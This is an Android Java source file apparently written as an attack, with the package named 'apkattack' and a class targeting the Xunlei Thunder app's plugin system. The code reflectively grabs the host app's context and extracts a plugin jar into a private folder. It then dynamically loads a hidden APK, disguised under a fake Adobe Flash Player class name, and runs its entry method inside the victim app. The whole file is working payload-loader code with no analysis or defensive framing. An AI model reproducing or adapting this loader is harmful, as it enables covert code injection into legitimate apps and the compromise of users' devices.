package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class ThunderPlugin {
	
	//Lcom/xunlei/plugin/qrcode/HelpActivity;
	//Lcom/xunlei/video/common/GlobleApplication;
	public static void thunderPluginEntry(){
    	String Tag = "thunderPluginEntry";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");

	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);

	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		

    		String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "fuck_Thunder/";

	    	String dexmethodname = "start";
	    	String cfgfn = "ark.dat";
	    	
	    	String apkfn = "simcard.apk";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
	    	File apk = new File(unzippath + "assets/" + apkfn);
	    	File config = new File(unzippath + "assets/"+ cfgfn);
	    	if (apk.exists() == false || config.exists() == false) {
	    		
	    		Log.e(Tag,"not found dex or config,run for first time");
		    	
	    		String ppapkfn = "26533329.jar";
		    	String pluginPath = apppath + "app_p_a/";
		    	File [] pluginpathFiles = new File(pluginPath).listFiles();
		    	for (int i = 0; i < pluginpathFiles.length; i++) {
					if (pluginpathFiles[i].getName().endsWith(".jar")) {
						ppapkfn = pluginpathFiles[i].getName();
					}
				}

				File unzippathfFile = new File(unzippath);
				if (unzippathfFile.exists() == false) {
					boolean ret = unzippathfFile.mkdirs();
					if (ret == false) {
						Log.e(Tag,"error create unzip folder:" + unzippath);
						return;
					}else{
						Log.e(Tag,"successully unzip make path:" + unzippath);
					}
				}else{
					Log.e(Tag,"already exist unzip path:" + unzippath);
				}
				
		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	
			String newapkfn = apkfn;
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					newapkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + newapkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "load apk exception");
    	}
	}
}
